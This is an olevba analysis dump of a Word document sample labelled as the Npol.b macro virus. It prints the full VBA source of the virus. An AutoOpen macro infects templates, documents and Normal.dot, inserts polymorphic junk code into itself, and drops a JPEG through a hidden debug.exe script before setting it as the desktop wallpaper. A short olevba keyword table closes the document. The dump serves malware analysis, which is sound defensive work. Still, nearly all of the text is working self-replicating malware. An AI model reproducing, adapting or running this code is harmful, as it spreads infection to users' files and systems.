olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Npol.b-356af05e019f9d5b440173f438d75db6584dafb5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Npol.b-356af05e019f9d5b440173f438d75db6584dafb5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FF.bas 
in file: Virus.MSWord.Npol.b-356af05e019f9d5b440173f438d75db6584dafb5 - OLE stream: 'Macros/VBA/FF'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub AutoOpen()
On Error Resume Next
Randomize (Timer)
SpreadDir = Application.Path & "\"
Victim = Dir(SpreadDir & "\*.dot")
Do Until Victim = ""
    SetAttr SpreadDir & Victim, vbNormal
    Application.OrganizerCopy ThisDocument.FullName, SpreadDir & Victim, "FF", wdOrganizerObjectProjectItems
    Victim = Dir
Loop
Application.OrganizerCopy ThisDocument.FullName, SpreadDir & "\*.doc", "FF", wdOrganizerObjectProjectItems
SpreadDir = Environ("WINDIR") & "\Recent"
Chk = Dir(recent & "\*.doc")
If Chk = True Then Application.OrganizerCopy ThisDocument.FullName, SpreadDir & "\*.doc", "FF", wdOrganizerObjectProjectItems
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "FF" Then GoTo AlreadyDone
Next i
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "FF", wdOrganizerObjectProjectItems
AlreadyDone:
If Int(Rnd * 24) > Hour(Time) Then
    MorphFactor = Int(Rnd * 10)
    Select Case MorphFactor
    Case 1
        Fake = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & CStr(Int(Rnd * 999999999))
    Case 2
        Fake = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & Chr(58) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(58)
    Case 3
        Fake = "DoEvents"
    Case 4
        Fake = "'" & Application.UserName & Application.UserAddress & Application.ActivePrinter
    Case 5
        JumpPoint = Chr(Int(Rnd * 5) + 65) & Hex(CStr(Oct(MorphFactor ^ 4) & CStr(Day(Date)) & CStr(Minute(Time)) & CStr(Hour(Time))))
        Fake = "Goto " & JumpPoint & Chr(13) & JumpPoint & ":"
    Case 6
        Fake = Chr(13)
    Case 7
        Fake = "For " & Chr(MorphFactor + 65) & " = 1 To 1" & Chr(13) & "Next " & Chr(MorphFactor + 65)
    Case 8
        Fake = "Rem"
    Case 9
        Fake = "If " & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & CStr(Int(Rnd * 45)) & "Then " & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & CStr(Int(Rnd * 45))
    Case 10
        Fake = "Do" & Chr(13) & "Exit Do" & Chr(13) & "Loop"
    End Select
    ThisDocument.VBProject.VBComponents("FF").CodeModule.InsertLines Int(Rnd * ThisDocument.VBProject.VBComponents("FF").CodeModule.CountOfLines - 3) + 1, Fake
End If
Open Environ("WINDIR") & "\System\Bio.tmp" For Output As #1
Print #1, "N " & Environ("WINDIR") & "\System\" & "BIO.JPG"
Print #1, "E 0100 FF D8 FF E0 00 10 4A 46 49 46 00 01 01 00 00 01 "
Print #1, "E 0110 00 01 00 00 FF DB 00 43 00 35 25 28 2F 28 21 35 "
Print #1, "E 0120 2F 2B 2F 3C 39 35 3F 50 85 57 50 49 49 50 A3 75 "
Print #1, "E 0130 7B 61 85 C1 AA CB C8 BE AA BA B7 D5 F0 FF FF D5 "
Print #1, "E 0140 E2 FF E6 B7 BA FF FF FF FF FF FF FF FF FF CE FF "
Print #1, "E 0150 FF FF FF FF FF FF FF FF FF FF DB 00 43 01 39 3C "
Print #1, "E 0160 3C 50 46 50 9D 57 57 9D FF DC BA DC FF FF FF FF "
Print #1, "E 0170 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF "
Print #1, "E 0180 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF "
Print #1, "E 0190 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF C0 "
Print #1, "E 01A0 00 11 08 00 DB 01 33 03 01 22 00 02 11 01 03 11 "
Print #1, "E 01B0 01 FF C4 00 1F 00 00 01 05 01 01 01 01 01 01 00 "
Print #1, "E 01C0 00 00 00 00 00 00 00 01 02 03 04 05 06 07 08 09 "
Print #1, "E 01D0 0A 0B FF C4 00 B5 10 00 02 01 03 03 02 04 03 05 "
Print #1, "E 01E0 05 04 04 00 00 01 7D 01 02 03 00 04 11 05 12 21 "
Print #1, "E 01F0 31 41 06 13 51 61 07 22 71 14 32 81 91 A1 08 23 "
Print #1, "E 0200 42 B1 C1 15 52 D1 F0 24 33 62 72 82 09 0A 16 17 "
Print #1, "E 0210 18 19 1A 25 26 27 28 29 2A 34 35 36 37 38 39 3A "
Print #1, "E 0220 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A "
Print #1, "E 0230 63 64 65 66 67 68 69 6A 73 74 75 76 77 78 79 7A "
Print #1, "E 0240 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 "
Print #1, "E 0250 9A A2 A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 "
Print #1, "E 0260 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4 D5 "
Print #1, "E 0270 D6 D7 D8 D9 DA E1 E2 E3 E4 E5 E6 E7 E8 E9 EA F1 "
Print #1, "E 0280 F2 F3 F4 F5 F6 F7 F8 F9 FA FF C4 00 1F 01 00 03 "
Print #1, "E 0290 01 01 01 01 01 01 01 01 01 00 00 00 00 00 00 01 "
Print #1, "E 02A0 02 03 04 05 06 07 08 09 0A 0B FF C4 00 B5 11 00 "
Print #1, "E 02B0 02 01 02 04 04 03 04 07 05 04 04 00 01 02 77 00 "
Print #1, "E 02C0 01 02 03 11 04 05 21 31 06 12 41 51 07 61 71 13 "
Print #1, "E 02D0 22 32 81 08 14 42 91 A1 B1 C1 09 23 33 52 F0 15 "
Print #1, "E 02E0 62 72 D1 0A 16 24 34 E1 25 F1 17 18 19 1A 26 27 "
Print #1, "E 02F0 28 29 2A 35 36 37 38 39 3A 43 44 45 46 47 48 49 "
Print #1, "E 0300 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 "
Print #1, "E 0310 6A 73 74 75 76 77 78 79 7A 82 83 84 85 86 87 88 "
Print #1, "E 0320 89 8A 92 93 94 95 96 97 98 99 9A A2 A3 A4 A5 A6 "
Print #1, "E 0330 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 "
Print #1, "E 0340 C5 C6 C7 C8 C9 CA D2 D3 D4 D5 D6 D7 D8 D9 DA E2 "
Print #1, "E 0350 E3 E4 E5 E6 E7 E8 E9 EA F2 F3 F4 F5 F6 F7 F8 F9 "
Print #1, "E 0360 FA FF DA 00 0C 03 01 00 02 11 03 11 00 3F 00 CC "
Print #1, "E 0370 A2 8A 28 00 A2 8A 28 00 A2 8A 28 00 A2 8A 28 00 "
Print #1, "E 0380 A2 8A 31 40 05 14 62 8C 50 01 45 14 50 01 45 14 "
Print #1, "E 0390 50 01 45 14 50 01 45 14 A0 50 02 51 8A 76 DA 31 "
Print #1, "E 03A0 55 61 D8 6D 14 EC 52 11 4A C1 61 28 A3 14 52 10 "
Print #1, "E 03B0 51 45 14 00 51 45 14 00 51 45 14 00 51 45 14 00 "
Print #1, "E 03C0 51 45 14 00 51 45 14 00 51 45 14 00 51 45 14 00 "
Print #1, "E 03D0 51 45 14 00 51 45 14 00 51 45 28 A0 03 14 BB 73 "
Print #1, "E 03E0 4E 51 4F 02 B4 51 2D 22 3D B4 9B 6A 5C 51 8A AE "
Print #1, "E 03F0 51 F2 90 91 8A 31 52 95 A6 95 A9 71 13 89 1D 18 "
Print #1, "E 0400 A7 ED A4 DB 53 CA C9 B0 DC 51 4F C5 01 79 A3 94 "
Print #1, "E 0410 2C 20 19 A7 05 A5 03 14 F0 2B 45 12 D4 46 81 4B "
Print #1, "E 0420 8A 70 14 B8 1E B5 56 2E C4 65 69 85 79 A9 A9 B8 "
Print #1, "E 0430 A4 E2 4B 89 16 31 49 52 91 4D 2B 50 E2 4B 44 78 "
Print #1, "E 0440 A3 14 FD B4 6D A9 E5 64 D8 66 28 C5 3F 6D 21 18 "
Print #1, "E 0450 A2 C1 61 B4 50 45 15 22 0A 28 A2 80 0A 28 A2 80 "
Print #1, "E 0460 0A 28 A2 80 0A 28 A2 80 0A 28 A2 80 0A 28 A2 80 "
Print #1, "E 0470 0A 28 A3 14 00 52 8E B4 98 A7 0A 68 68 91 69 E0 "
Print #1, "E 0480 64 E0 75 A6 8A 96 26 D9 20 6F 4A DD 6C 6A 84 64 "
Print #1, "E 0490 64 38 61 8A 6D 68 CA 8B 71 16 EF E2 C7 41 59 C5 "
Print #1, "E 04A0 0C 6D 82 08 FA D0 9D C7 70 C5 21 14 BB 8D 2D 30 "
Print #1, "E 04B0 19 8A 36 D3 A8 C5 16 0B 0D C5 2E 29 E5 48 EA 29 "
Print #1, "E 04C0 31 45 82 C3 71 4E 51 93 4F 8E 3D C4 86 AB 30 5B "
Print #1, "E 04D0 E3 A8 E0 D0 DD 83 62 01 13 EE F9 57 22 AA CE 8C "
Print #1, "E 04E0 92 10 73 5B 2C 63 81 0E 08 CF 61 9A CC 9D BC F9 "
Print #1, "E 04F0 37 30 A9 F8 8C DA 6F 52 38 DF 70 C1 ED 4E E2 9B "
Print #1, "E 0500 E4 E7 A0 34 DD A5 4E 7D 28 4D A2 AE D6 E8 93 14 "
Print #1, "E 0510 98 A4 57 24 E0 8C 53 B8 AA DC AD C6 E2 8C 53 A9 "
Print #1, "E 0520 71 C6 7B 51 60 B0 CC 52 11 4F 04 1E 87 34 84 52 "
Print #1, "E 0530 68 56 21 23 14 D2 2A 66 15 19 15 94 91 9B 43 68 "
Print #1, "E 0540 A2 8A 82 42 8A 28 A0 02 8A 28 A0 02 8A 28 A0 02 "
Print #1, "E 0550 8A 28 A0 02 8C 52 81 4E 02 9A 43 48 6E 0D 28 14 "
Print #1, "E 0560 F0 B4 E0 2A D4 4A 51 23 DB 4E 0B 4F C5 00 55 F2 "
Print #1, "E 0570 95 CA 00 52 8A 31 52 C2 81 D8 29 EA 6A B6 2A F6 "
Print #1, "E 0580 27 B4 76 18 07 A6 2A 1B 86 56 B8 6C FB D5 A9 50 "
Print #1, "E 0590 41 6C 4F F1 01 59 45 8B 36 E3 D4 D2 4D 37 73 37 "
Print #1, "E 05A0 22 6C 02 70 29 76 30 ED 50 AB 95 E9 4F F3 58 F7 "
Print #1, "E 05B0 A6 35 20 C1 06 A5 8D 0B 9A 6A 30 CF CD D2 AC 47 "
Print #1, "E 05C0 24 6A 38 34 6C 5A 64 8F 09 61 C8 A8 3C 93 9A 73 "
Print #1, "E 05D0 5D C9 DB 15 11 B8 93 3D A8 57 43 BB 5B 96 E2 54 "
Print #1, "E 05E0 51 F3 71 4B 2D D2 C6 B8 42 0D 50 79 9D C6 1A A2 "
Print #1, "E 05F0 3C 9A 96 BA B2 1B B9 34 93 B4 AD 96 EB 4C DD 51 "
Print #1, "E 0600 E6 93 34 EE 4F 31 37 9A 45 26 F0 C7 9A 87 34 66 "
Print #1, "E 0610 97 30 73 32 7C 6E 38 02 82 AC 3B 54 2B 23 21 CA "
Print #1, "E 0620 D2 F9 CE 7A 9A 5C C1 CC 48 A4 E7 15 67 CA 3E 47 "
Print #1, "E 0630 35 5E 17 41 CB 1E 6A 49 2E BF 85 08 DB 54 99 4A "
Print #1, "E 0640 45 73 94 6C AD 48 08 61 C5 33 39 A4 1F 29 E3 A7 "
Print #1, "E 0650 7A 57 B3 04 EC 3C 8A 63 0A 90 10 C3 22 90 8A 6D "
Print #1, "E 0660 0D AB 90 91 4D A9 58 54 64 56 32 56 33 68 4A 28 "
Print #1, "E 0670 A2 A4 90 A2 8A 28 00 A2 8A 28 00 A0 51 45 00 3D "
Print #1, "E 0680 45 48 05 35 6A 41 5B C5 1A C5 08 05 2E 2A 5F 21 "
Print #1, "E 0690 84 61 F8 C5 34 C6 CC 40 00 8F 7C 55 03 92 43 71 "
Print #1, "E 06A0 81 93 D2 9B BD 6A CC 76 AC 47 26 8F B3 85 7E 71 "
Print #1, "E 06B0 4A E4 FB 47 D0 62 46 64 C6 DF E5 57 E2 8D 60 4D "
Print #1, "E 06C0 D2 63 23 BD 57 17 50 45 F2 9C E4 7B 55 29 6E E5 "
Print #1, "E 06D0 93 23 79 DA 7B 60 54 B6 D9 17 B9 25 E5 D9 99 F0 "
Print #1, "E 06E0 87 E4 C5 54 A2 8A 4B 41 0B 9A 50 69 B4 A2 AD 30 "
Print #1, "E 06F0 1E 2A 45 A8 D7 AD 48 B5 46 D0 14 D3 0F 5A 79 A6 "
Print #1, "E 0700 9A 19 4C 61 A6 E6 9E 45 30 82 6A 19 93 1A 68 A5 "
Print #1, "E 0710 C5 25 66 C4 14 51 45 45 C0 28 A4 A5 A2 E0 14 0E "
Print #1, "E 0720 28 A2 9A 60 3C 1F 5A 75 46 29 E2 B5 5A 8D 31 03 "
Print #1, "E 0730 6C 6C 7F 0D 4B 90 46 47 4A 89 C6 45 3E 36 04 6D "
Print #1, "E 0740 EF 4D 3D 6C 5C 5E B6 06 15 19 5A 98 8A 69 14 35 "
Print #1, "E 0750 71 B4 42 45 25 48 C2 98 6B 26 AC 64 D0 94 51 45 "
Print #1, "E 0760 48 82 8A 28 A0 02 9C BD 69 B4 F5 A6 86 89 14 53 "
Print #1, "E 0770 85 34 53 B3 B5 73 5B A3 55 A2 27 B6 66 76 2A 4E "
Print #1, "E 0780 40 1D 2A DD D4 D1 40 AB B9 72 4F A0 AA B6 8E 03 "
Print #1, "E 0790 16 3D C0 AA 73 C8 D2 48 77 1C 80 4E 2A 5A BB 31 "
Print #1, "E 07A0 BD F5 25 9A ED 98 FE EC 95 1F 5A 84 CB 21 EA ED "
Print #1, "E 07B0 F9 D3 28 A2 C2 03 CF 5A 28 A2 8B 00 51 45 14 00 "
Print #1, "E 07C0 52 8A 4A 70 14 D0 0E 51 52 0A 62 8A 90 55 A3 68 "
Print #1, "E 07D0 21 69 31 4B 4A AA 5D 82 A8 C9 3D A8 7A 16 C6 15 "
Print #1, "E 07E0 F6 A6 EC 3E 86 A5 60 BB 8E C2 4A F6 24 63 34 E8 "
Print #1, "E 07F0 91 24 CA 97 D8 DD B2 38 3F 8D 27 6D C9 69 6E 41 "
Print #1, "E 0800 B7 D4 62 98 CB 53 B2 B2 9C 32 E0 D3 18 52 71 40 "
Print #1, "E 0810 D6 84 14 62 A5 DB 48 56 B3 70 23 94 8A 8A 52 39 "
Print #1, "E 0820 C5 25 66 D1 22 D1 45 14 20 14 75 A7 AD 30 53 D6 "
Print #1, "E 0830 B6 88 D0 E2 3E 5A 87 91 D2 AC 7F 0D 42 79 E2 9C "
Print #1, "E 0840 90 E7 A5 87 AC A3 00 1E B4 F2 2A B1 18 A9 A1 39 "
Print #1, "E 0850 53 93 4A 32 BB B3 2A 32 BE 8C 56 15 1B 0A 98 8A "
Print #1, "E 0860 61 14 E4 AE 12 44 26 8A 71 14 DA C5 A3 36 14 51 "
Print #1, "E 0870 45 21 05 3D 69 94 E5 E0 D3 5B 8D 12 8A 57 FB 86 "
Print #1, "E 0880 91 4D 38 1A DD 6C 6A 88 03 32 F4 24 51 4F 91 3F "
Print #1, "E 0890 88 75 A6 03 8A 8D 53 B3 32 6A C1 46 29 DB 68 DB "
Print #1, "E 08A0 57 61 58 6E 28 C5 3F 6D 2E CA 76 1F 2B 23 C5 18 "
Print #1, "E 08B0 A9 0A E7 B5 2E DA 2C 3E 46 46 05 38 2D 3F 6D 28 "
Print #1, "E 08C0 5A 76 29 40 40 29 F4 9D 29 69 9A 25 61 3B E6 A7 "
Print #1, "E 08D0 B7 2D E7 C6 A8 55 5C 67 69 20 F3 C7 7F 5F 6A 84 "
Print #1, "E 08E0 01 C6 E2 40 3E 83 27 F2 A1 B7 09 0C 8B 1B C3 CE "
Print #1, "E 08F0 57 20 FC BF 89 F5 AC 6A 49 6C 67 51 AD 87 C7 04 "
Print #1, "E 0900 AF 1A B2 46 C5 48 E0 E4 52 32 34 4E 9E 6A ED 04 "
Print #1, "E 0910 83 F3 73 9E 6A 46 31 5D 6F 73 1E 26 C8 C9 2C 76 "
Print #1, "E 0920 81 F5 E9 FE 7D 68 69 22 B7 76 16 AB B0 B1 FB C7 "
Print #1, "E 0930 D3 DB 3D 68 F6 8C 9E 77 62 5B F4 E9 20 61 B5 7E "
Print #1, "E 0940 4D B8 AA 78 A9 B7 13 08 8C A4 9B 01 1C EC 3C 0A "
Print #1, "E 0950 8D 97 1C 83 B9 73 80 C3 FC F0 7D AA A9 C9 5A C5 "
Print #1, "E 0960 53 92 B5 86 E2 90 8A 75 25 5D 8D 08 99 6A 3C 62 "
Print #1, "E 0970 AC 11 51 B0 E6 B3 94 4C E4 88 E8 A3 14 A0 54 28 "
Print #1, "E 0980 90 00 54 8A 29 00 A9 14 56 A9 17 14 0D C0 A8 0F "
Print #1, "E 0990 5A 99 CD 42 69 C8 55 1E A3 69 55 8A 90 68 A4 35 "
Print #1, "E 09A0 83 D1 90 8B 0A C1 97 34 11 51 45 F7 C5 4C 6B 58 "
Print #1, "E 09B0 BB A3 64 EE 88 98 54 66 A5 7E 95 19 EB 59 C8 CE "
Print #1, "E 09C0 42 51 45 15 04 85 2D 25 14 01 22 9A 78 35 08 A7 "
Print #1, "E 09D0 A9 AD 63 22 D3 25 06 A3 91 42 F2 3B D3 C5 29 50 "
Print #1, "E 09E0 C3 9A D3 72 DA BA 11 06 56 94 2F AD 3A 11 C8 06 "
Print #1, "E 09F0 89 7E 57 2B 42 04 AD B8 98 14 64 0A 66 69 33 4E "
Print #1, "E 0A00 E1 CC 49 9A 33 51 6E A3 75 17 17 31 2E 69 37 53 "
Print #1, "E 0A10 37 51 9A 57 0E 61 F9 A5 ED CD 30 1A 7F 51 CD 34 "
Print #1, "E 0A20 52 77 27 98 98 DC AE 00 93 F8 8A 8E 17 D3 6F A7 "
Print #1, "E 0A30 BD 0B 2B 08 F7 B6 64 55 C7 9A 24 39 1C 9E 31 51 "
Print #1, "E 0A40 3B 33 B9 77 39 63 D4 F4 A1 18 23 86 2A 18 0C FC "
Print #1, "E 0A50 A4 E3 35 0E 1E ED 89 70 F7 49 EE 20 58 76 C6 B3 "
Print #1, "E 0A60 6D 47 04 FC E7 83 8A 78 58 8C 0B 2B 90 CB 0A 95 "
Print #1, "E 0A70 E9 F2 B1 38 FF 00 3F 5F A5 57 95 82 43 14 63 00 "
Print #1, "E 0A80 85 6C A9 EA BF 9F AD 3A 32 1A DC 37 DF 30 F0 10 "
Print #1, "E 0A90 7A F5 DD C7 A7 35 8E BF 09 95 FA 03 4C E5 22 2B "
Print #1, "E 0AA0 26 32 9C 84 38 19 FA 50 80 4A AC 08 23 6A 13 85 "
Print #1, "E 0AB0 E1 78 EE 47 AF BD 44 CC 59 8B 31 C9 3C 93 8C 66 "
Print #1, "E 0AC0 92 B7 E5 D0 D9 47 41 68 A2 8A B2 C4 34 C2 2A 4A "
Print #1, "E 0AD0 42 29 34 4B 57 22 DB 4A 16 9F B4 52 F1 4A C4 F2 "
Print #1, "E 0AE0 8D 0B 4E 27 02 90 B5 30 B5 31 B6 90 8C 6A 33 4A "
Print #1, "E 0AF0 4D 25 4B 66 2D DC 29 28 A7 22 16 23 D3 BD 62 F5 "
Print #1, "E 0B00 7A 02 57 1D 10 3B 81 C7 15 29 A0 00 A3 03 A5 21 "
Print #1, "E 0B10 35 B2 5C AA C6 C9 59 0C 7E 95 19 EB 4F 63 4C 35 "
Print #1, "E 0B20 94 99 9C 84 A2 8A 2A 09 0A 28 A2 80 0A 70 34 DA "
Print #1, "E 0B30 70 A6 86 89 56 9C 29 AB D2 9C 3A 57 42 36 44 91 "
Print #1, "E 0B40 7D F1 F8 D4 77 07 F7 E7 FC F6 A5 8D 80 70 4D 47 "
Print #1, "E 0B50 3B 6E 98 91 D2 93 64 49 8D CD 26 69 B4 54 39 10 "
Print #1, "E 0B60 2E 7D CD 19 F7 34 94 52 E6 01 41 A5 07 9A 6D 14 "
Print #1, "E 0B70 29 01 22 9A 90 1E 2A 10 79 A9 15 AB 44 CB 8B 27 "
Print #1, "E 0B80 85 D5 1F E7 8C 3A 9E B9 19 23 E9 4E 92 65 27 09 "
Print #1, "E 0B90 0C 2A A7 BE CC 11 50 66 97 34 DC 53 29 C5 37 72 "
Print #1, "E 0BA0 4C C4 A4 B8 12 49 21 FF 00 9E B8 65 FC 68 DC 80 "
Print #1, "E 0BB0 F9 89 E6 47 27 A2 90 17 E8 3D A9 94 94 BD 9C 45 "
Print #1, "E 0BC0 EC D1 2C 6F 1A 92 CF 18 66 20 E1 71 F2 83 F4 A8 "
Print #1, "E 0BD0 C9 C9 27 00 64 E7 03 A0 FA 52 13 4D DD 54 95 86 "
Print #1, "E 0BE0 92 43 E8 A6 6E A4 2D 45 C7 CC 87 13 4D 2F 8A 61 "
Print #1, "E 0BF0 6C D3 49 A4 D9 9B 9B E8 49 E6 52 6F A8 E8 A5 CC "
Print #1, "E 0C00 4F 33 1D BA 93 34 94 52 B9 21 48 69 69 2A 24 C0 "
Print #1, "E 0C10 72 29 63 C5 4E 00 51 81 51 C1 DE A4 35 50 56 57 "
Print #1, "E 0C20 36 8A B2 B8 84 D3 18 D2 B1 A8 C9 A2 52 13 60 4D "
Print #1, "E 0C30 36 8A 2B 26 40 51 45 14 84 14 51 45 00 14 E1 4D "
Print #1, "E 0C40 A5 1D 69 A1 A2 65 E9 4E 1D 29 8A 69 E2 B7 46 A8 "
Print #1, "E 0C50 83 71 E7 9A 4C E7 AD 4C F1 EF 39 1C 54 2C BB 58 "
Print #1, "E 0C60 8A CE 57 46 6D 34 14 99 A2 8A 8B 92 19 A3 34 51 "
Print #1, "E 0C70 48 03 34 B9 A4 A2 80 17 34 E0 69 94 B5 4A 56 19 "
Print #1, "E 0C80 28 34 E0 6A 10 69 E1 C5 6A A4 8A 4C 96 9A 4D 28 "
Print #1, "E 0C90 6E 2A 36 35 65 C9 E8 21 6A 4C 93 48 69 2A 1C 8C "
Print #1, "E 0CA0 6E D8 EC D2 6E A4 A4 CD 43 93 18 B9 A4 A2 8A 9B "
Print #1, "E 0CB0 88 28 A2 8A 2E 02 D2 51 4B 4E E0 14 94 B4 94 9B "
Print #1, "E 0CC0 02 58 3B D3 CD 36 34 DB CE 7A 8A 71 AD 63 A4 4D "
Print #1, "E 0CD0 96 88 8D E9 86 9E D5 19 AC E4 67 20 A2 8A 2A 09 "
Print #1, "E 0CE0 0A 28 A2 80 0A 28 A2 80 0A 51 49 45 00 3D 4E 2A "
Print #1, "E 0CF0 40 6A 10 69 C1 AB 48 C8 B4 C9 B3 47 14 C0 D4 B9 "
Print #1, "E 0D00 AD 2E 5D C7 71 E9 47 1E 94 DC D1 9A 77 1D C7 71 "
Print #1, "E 0D10 E9 47 1E 94 DC D1 9A 2E 17 1D C7 A5 1C 7A 53 73 "
Print #1, "E 0D20 46 68 B8 5C 7F 1E 95 19 87 24 9C D3 81 A3 34 9A "
Print #1, "E 0D30 4F 70 76 7B 91 3A 6C 3C 73 9A 6F 3E 95 63 34 B9 "
Print #1, "E 0D40 F6 A9 E4 27 91 10 67 02 93 3F 8D 4A D1 06 39 CD "
Print #1, "E 0D50 46 F1 ED C6 39 A4 D3 44 B8 B1 B9 A2 8C 1F 4A 05 "
Print #1, "E 0D60 43 77 20 43 45 14 52 60 14 66 8A 29 00 51 45 1D "
Print #1, "E 0D70 68 00 A2 8C 1F 43 46 0F A1 A6 01 47 5A 72 A9 2D "
Print #1, "E 0D80 8A 95 63 08 73 9C D5 28 B6 52 8B 63 87 DC 1F 4A "
Print #1, "E 0D90 69 34 E3 4C 63 5A BD 8D 18 C6 34 C3 4E 3D 69 B5 "
Print #1, "E 0DA0 83 32 61 45 14 52 10 51 45 14 00 51 45 14 00 51 "
Print #1, "E 0DB0 45 14 00 52 D2 51 40 0E CD 2E EA 66 68 CD 3B 8E "
Print #1, "E 0DC0 E3 F7 51 BA 99 45 3E 60 B8 FD D4 6E A6 51 47 30 "
Print #1, "E 0DD0 5C 7E EA 37 53 28 A3 98 2E 48 1A 94 35 45 4A 38 "
Print #1, "E 0DE0 A6 A4 3B 93 66 80 6A 2D D4 A1 AA F9 8A 52 25 CD "
Print #1, "E 0DF0 2E 6A 30 D4 EC D5 29 14 98 E3 F3 0C 1A 81 D4 A9 "
Print #1, "E 0E00 F6 A9 81 A5 20 30 C1 A5 25 CC 0D 73 15 A8 A9 FC "
Print #1, "E 0E10 A5 A3 CA 5A 8F 66 C8 E4 64 14 BB 58 F6 35 37 94 "
Print #1, "E 0E20 B4 EE 83 14 2A 7D C6 A1 DC 89 22 DD 9D D9 14 F5 "
Print #1, "E 0E30 8C 29 CE 69 D9 A4 CD 5A 8A 45 24 90 EC D1 9A 61 "
Print #1, "E 0E40 34 66 AA E3 B8 EC D2 66 93 34 D2 D4 9B 13 63 89 "
Print #1, "E 0E50 A8 D8 D0 5A 9A 4D 67 29 10 D8 94 51 45 66 40 51 "
Print #1, "E 0E60 45 14 00 51 45 14 00 51 45 14 00 51 45 14 00 51 "
Print #1, "E 0E70 45 14 00 51 45 14 00 51 45 14 00 51 45 14 00 51 "
Print #1, "E 0E80 45 14 00 51 45 14 00 51 9A 28 A0 05 06 94 1A 6D "
Print #1, "E 0E90 00 D3 4C 77 26 53 4E CD 42 0D 38 35 68 A4 5A 91 "
Print #1, "E 0EA0 26 68 CD 47 B8 D1 B8 D5 73 0F 98 93 34 13 51 EE "
Print #1, "E 0EB0 34 9B A9 73 07 30 FD D4 D2 DC D3 72 69 0D 4B 91 "
Print #1, "E 0EC0 2E 43 8B 52 66 9B 9A 2A 79 89 B8 EC D2 13 F4 A4 "
Print #1, "E 0ED0 A2 95 C2 E1 9A 28 A2 90 82 8A 28 A0 02 8A 28 A0 "
Print #1, "E 0EE0 02 8A 28 A0 02 8A B4 21 8F 27 E5 EE 7B FB 9A 5F "
Print #1, "E 0EF0 26 3F EE FE B4 01 52 8A B7 E4 C7 FD DF D6 8F 26 "
Print #1, "E 0F00 3F EE FE B4 01 52 8A B7 E4 C7 FD DF D6 8F 26 3F "
Print #1, "E 0F10 EE FE B4 01 52 8A B7 E4 C7 FD DF D6 8F 26 3F EE "
Print #1, "E 0F20 FE B4 01 52 8A B7 E4 C7 FD DF D6 8F 26 3F EE FE "
Print #1, "E 0F30 B4 01 52 8A B7 E4 C7 FD DF D6 8F 26 3F EE FE B4 "
Print #1, "E 0F40 01 52 8A B7 E4 C7 FD DF D6 8F 26 3F EE FE B4 01 "
Print #1, "E 0F50 52 8A B7 E4 C7 FD DF D6 8F 26 3F EE FE B4 01 52 "
Print #1, "E 0F60 8A B7 E4 C7 FD DF D6 8F 26 3F EE FE B4 01 52 8A "
Print #1, "E 0F70 B7 E4 C7 FD DF D6 8F 26 3F EE FE B4 01 52 8C D5 "
Print #1, "E 0F80 BF 26 3F EE FE B4 79 31 FF 00 77 F5 A0 0A B9 A3 "
Print #1, "E 0F90 35 6B C9 8F FB BF AD 1E 4C 7F DD FD 68 0B 95 73 "
Print #1, "E 0FA0 49 9A B7 E4 C7 FD DF D6 8F 26 3F EE FE B4 01 52 "
Print #1, "E 0FB0 8A B7 E4 C7 FD DF D6 8F 26 3F EE FE B4 01 52 8A "
Print #1, "E 0FC0 B7 E4 C7 FD DF D6 8F 26 3F EE FE B4 01 52 8A B7 "
Print #1, "E 0FD0 E4 C7 FD DF D6 8F 26 3F EE FE B4 01 52 8A B7 E4 "
Print #1, "E 0FE0 C7 FD DF D6 8F 26 3F EE FE B4 01 52 8A B7 E4 C7 "
Print #1, "E 0FF0 FD DF D6 8F 26 3F EE FE B4 01 52 8A B7 E4 C7 FD "
Print #1, "E 1000 DF D6 8F 26 3F EE FE B4 01 52 8A 7C AA 16 42 07 "
Print #1, "E 1010 02 99 40 1F FF D9 "
Print #1, "RCX"
Print #1, "0F16"
Print #1, "W"
Print #1, "Q"
Close #1
Shell Environ("WINDIR") & "\Command.com /c Debug <" & Environ("WINDIR") & "\System\Bio.tmp", vbHide
System.PrivateProfileString(Environ("WINDIR") & "\Win.ini", "Desktop", "Wallpaper") = Environ("WINDIR") & "\Bio.jpg"
System.PrivateProfileString(Environ("WINDIR") & "\Win.ini", "Desktop", "Wallpaperstyle") = 2
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
